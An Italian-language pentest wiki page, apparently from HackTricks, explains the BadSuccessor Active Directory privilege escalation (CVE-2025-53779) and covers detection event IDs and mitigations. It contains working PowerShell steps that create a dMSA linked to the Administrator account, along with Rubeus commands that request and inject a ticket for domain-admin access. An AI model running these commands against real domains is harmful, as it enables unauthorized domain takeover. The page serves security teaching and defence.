# BadSuccessor: Escalation dei privilegi tramite abuso della migrazione dMSA delegata

{{#include ../../banners/hacktricks-training.md}}

## Panoramica

I Managed Service Account delegati (**dMSA**) sono i successori di nuova generazione dei **gMSA**, disponibili in Windows Server 2025. Un workflow di migrazione legittimo consente agli amministratori di sostituire un account *precedente* (utente, computer o account di servizio) con un dMSA, preservando in modo trasparente le autorizzazioni. Il workflow è esposto tramite cmdlet PowerShell come `Start-ADServiceAccountMigration` e `Complete-ADServiceAccountMigration` e si basa su due attributi LDAP dell’**oggetto dMSA**:

* **`msDS-ManagedAccountPrecededByLink`** – collegamento *DN* all’account sostituito (precedente).
* **`msDS-DelegatedMSAState`**       – stato della migrazione (`0` = nessuno, `1` = in corso, `2` = *completata*).<sup>[[1]](#references)</sup>

Se un attaccante può creare **un qualsiasi** dMSA all’interno di una OU e manipolare direttamente questi 2 attributi, LSASS e il KDC tratteranno il dMSA come il *successore* dell’account collegato. Quando l’attaccante esegue successivamente l’autenticazione come dMSA, **eredita tutti i privilegi dell’account collegato** – fino a **Domain Admin** se viene collegato l’account Administrator.<sup>[[1]](#references)</sup>

Questa tecnica è stata denominata **BadSuccessor** da Unit 42 nel 2025. Microsoft le ha successivamente assegnato **CVE-2025-53779** e ha rilasciato un security update nell’**agosto 2025**. La tecnica rimane rilevante negli ambienti Windows Server 2025 senza patch e nelle revisioni delle deleghe OU pericolose.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Prerequisiti dell’attacco

1. Un account a cui è *consentito* creare oggetti all’interno di **un’Organizational Unit (OU)** e che dispone di almeno uno dei seguenti permessi:
* `Create Child` → classe di oggetti **`msDS-DelegatedManagedServiceAccount`**
* `Create Child` → **`All Objects`** (creazione generica)
2. Connettività di rete a LDAP e Kerberos (scenario standard con computer aggiunto al dominio / attacco remoto).<sup>[[1]](#references)</sup>

## Enumerazione delle OU vulnerabili

Unit 42 ha rilasciato uno script helper PowerShell che analizza i descrittori di sicurezza di ogni OU ed evidenzia gli ACE richiesti:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Dietro le quinte, lo script esegue una ricerca LDAP paginata per `(objectClass=organizationalUnit)` e verifica ogni `nTSecurityDescriptor` alla ricerca di

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Exploitation Steps

Una volta identificata una OU writable, l'attacco richiede solo 3 scritture LDAP:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Dopo la replica, l'attacker può semplicemente eseguire il **logon** come `attacker_dMSA$` o richiedere un Kerberos TGT: Windows creerà il token dell'account *sostituito*.<sup>[[1]](#references)</sup>

### Automation

Diversi PoC pubblici integrano l'intero workflow, incluso il recupero della password e la gestione dei ticket:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* Modulo NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Rilevamento e Hunting

Abilita **Object Auditing** sulle OU e monitora i seguenti Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Creazione dell'oggetto **dMSA**
* **5136** – Modifica di **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Modifiche specifiche degli attributi
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Emissione del TGT per il dMSA

La correlazione tra `4662` (modifica degli attributi), `4741` (creazione di un account computer/service) e `4624` (logon successivo) evidenzia rapidamente l'attività BadSuccessor. Le soluzioni XDR come **XSIAM** includono query pronte all'uso (vedi riferimenti).<sup>[[2]](#references)</sup>

## Mitigazione

* Applica l'aggiornamento di sicurezza di Microsoft per **CVE-2025-53779** e verifica il livello delle patch di ogni domain controller Windows Server 2025.<sup>[[6]](#references)</sup>
* Applica il principio del **least privilege**: delega la gestione degli *Service Account* solo a ruoli affidabili.
* Rimuovi `Create Child` / `msDS-DelegatedManagedServiceAccount` dalle OU che non ne richiedono esplicitamente l'utilizzo.
* Monitora gli event ID elencati sopra e genera un alert quando identità *non-Tier-0* creano o modificano dMSA.

## Vedi anche


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: abuso dei dMSA per l'escalation dei privilegi in Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Quando gli account legittimi diventano malevoli: sfruttamento dei Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Raccolta di strumenti per il Pentest](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [Modulo BadSuccessor di NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
